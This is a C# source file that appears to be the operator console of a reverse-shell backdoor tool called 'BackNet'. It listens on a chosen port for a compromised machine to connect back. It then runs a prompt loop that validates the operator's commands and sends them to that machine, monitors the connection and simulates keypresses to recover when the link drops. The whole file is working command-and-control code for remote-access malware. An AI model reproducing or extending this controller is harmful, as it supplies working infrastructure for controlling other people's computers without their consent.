using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Commands;
using NetworkManager;
using Shared;

namespace ReverseShellClient
{
    public class ClientManager
    {
        bool waitingForUserInput { get; set; } = false;


        /// <summary>
        /// Constructor sets default console coloras Green
        /// </summary>
        public ClientManager()
        {
            Console.ForegroundColor = ConsoleColor.Green;
        }


        /// <summary>
        /// Entry point of the client. Call methods to initiate port listening.
        /// When a remote computer connects to us, initiate the prompt loop and monitor the connection.
        /// If the other end disconnects, this will ask if the program should listen again
        /// </summary>
        public void Start()
        {
            DisplayBanner();

            var listen = true;

            while (listen)
            {
                Console.Write(@"Please type a port number to listen to : ");
                var port = 0;
                while (port == 0)
                {
                    try
                    {
                        port = int.Parse(Console.ReadLine());
                        if(port < 1 || port > 65535)
                            throw new ArgumentException();
                    }
                    catch (Exception)
                    {
                        Console.Write("This is not a valid port, please type again\n>");
                    }
                }

                // Listen and start connection
                GlobalNetworkManager.clientNetworkManager.ListenAndConnect(port);

                // Check if the connection is still active in the background
                var connectionMonitoringTask = new Task(MonitorConnection);
                connectionMonitoringTask.Start();

                // Process user input
                RunClient();
                
                // Connection ended, ask listen again
                listen = AskListenAgain();
            }
        }


        /// <summary>
        /// Check every second if the other end of the connection is still active.
        /// If it's not and the cleanup wasn't already made, cleanup and make the prompt loop exit
        /// </summary>
        void MonitorConnection()
        {
            while (true)
            {
                // The program is waiting for the user to enter a command, but the other end of the connection disconnected
                if (waitingForUserInput && !GlobalNetworkManager.clientNetworkManager.IsConnected())
                {
                    // Call cleanup method from ClientNetworkManager
                    GlobalNetworkManager.clientNetworkManager.Cleanup(processingCommand: false);
                    
                    // Send [ENTER] key to bypass the console.ReadLine()
                    var hWnd = Process.GetCurrentProcess().MainWindowHandle;
                    PostMessage(hWnd, WM_KEYDOWN, VK_RETURN, 0);

                    break;
                }

                // The program executed a method, but the other end of the connection disconnected, this was caught and the cleanup method was called was made
                if (!waitingForUserInput && GlobalNetworkManager.clientNetworkManager.CleanupMade())
                {
                    break;
                }

                // The other of the connection is still connected, wait and try again
                Thread.Sleep(1000);
            }
        }


        /// <summary>
        /// Main loop waiting for user input and processing it. Call commands and communicate with the server.
        /// </summary>
        void RunClient()
        {
            DisplayCommandPrompt();

            while (true)
            {
                waitingForUserInput = true;     // Used for the connectionMonitoringTask
                var commandString = Console.ReadLine();
                waitingForUserInput = false;

                // If the connection was closed, break from the loop
                if (!GlobalNetworkManager.clientNetworkManager.IsConnected())
                {
                    break;
                }


                if (commandString == "clear" || commandString == "cls")
                {
                    // Clear console
                    Console.Clear();
                }
                else if (commandString == "help")
                {
                    // Global help section
                    CommandsManager.ShowGlobalHelp();
                }
                else if (commandString != "")
                {
                    var splittedCommand = CommandsManager.GetSplittedCommand(commandString);
                    var commandName = splittedCommand[0];

                    ICommand command = CommandsManager.GetCommandByName(commandName);
                    if (command != null)
                    {
                        var arguments = new List<string>();

                        if (splittedCommand.Count > 1)
                        {
                            arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
                        }


                        if (arguments.Count == 1 && arguments[0] == "help")
                        {
                            // Display command's help
                            CommandsManager.ShowCommandHelp(command);

                            DisplayCommandPrompt();
                            continue;
                        }


                        if (!CommandsManager.CheckCommandSyntax(command, arguments))
                        {
                            ColorTools.WriteCommandError(
                                $"Syntax error, check out the command's help page ({commandName} help)");

                            DisplayCommandPrompt();
                            continue;
                        }


                        var preProcessResult = true;
                        try
                        {
                            preProcessResult = command.PreProcessCommand(arguments);
                        }
                        catch (NotImplementedException)
                        {
                            // Ignored
                        }

                        if (preProcessResult == false)
                        {
                            // Error in the PreProcess method
                            DisplayCommandPrompt();
                            continue;
                        }


                        try
                        {
                            if (!command.isLocal)
                            {
                                // Send the command to the server
                                GlobalNetworkManager.WriteLine(commandString);
                            }

                            command.ClientMethod(arguments);
                        }
                        catch (ExitException)
                        {
                            // The client called the 'Exit' or 'Terminate' command
                            Cleanup(isCommandProcessing: false);
                            break;
                        }
                        catch (IOException)
                        {
                            // Most likely the server disconnected, or a command didn't catch its exception...
                            Cleanup(isCommandProcessing: true);
                            break;
                        }
                    }
                    else
                    {
                        ColorTools.WriteError($"'{commandName}' is not a known command");
                    }
                }

                DisplayCommandPrompt();
            }
        }


        /// <summary>
        /// Simple method to ask if the program should listen again on a port for an incomming connection
        /// </summary>
        /// <returns>User's choice</returns>
        bool AskListenAgain()
        {
            // 'Yes' is the default choice
            Console.Write("Listen again ? (Y/n) ");
            var input = Console.ReadLine();
            Console.Clear();

            return input != "n" && input != "N";
        }


        /// <summary>
        /// Call the clientNetworkManager Cleanup Method to dispose the network stream and listener
        /// </summary>
        /// <param name="isCommandProcessing">Is the program currently processing user input ?</param>
        void Cleanup(bool isCommandProcessing)
        {
            try
            {
                GlobalNetworkManager.clientNetworkManager.Cleanup(isCommandProcessing);
            }
            catch (Exception)
            {
                // Ignored
            }
        }


        /// <summary>
        /// Show the program's banner
        /// </summary>
        void DisplayBanner()
        {
            Console.WriteLine("\n    ██████╗  █████╗  ██████╗██╗  ██╗███╗   ██╗███████╗████████╗\n    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝████╗  ██║██╔════╝╚══██╔══╝\n    ██████╔╝███████║██║     █████╔╝ ██╔██╗ ██║█████╗     ██║   \n    ██╔══██╗██╔══██║██║     ██╔═██╗ ██║╚██╗██║██╔══╝     ██║   \n    ██████╔╝██║  ██║╚██████╗██║  ██╗██║ ╚████║███████╗   ██║   \n    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝\n\n");
        }


        /// <summary>
        /// Print the cmd prompt of the program to indicate it's waiting for user input
        /// </summary>
        void DisplayCommandPrompt() => Console.Write("BackNet>");


        #region Simulate user input

        [DllImport("User32.Dll", EntryPoint = "PostMessageA")]
        static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);

        const int VK_RETURN = 0x0D;
        const int WM_KEYDOWN = 0x100;

        #endregion Simulate user input
    }
}
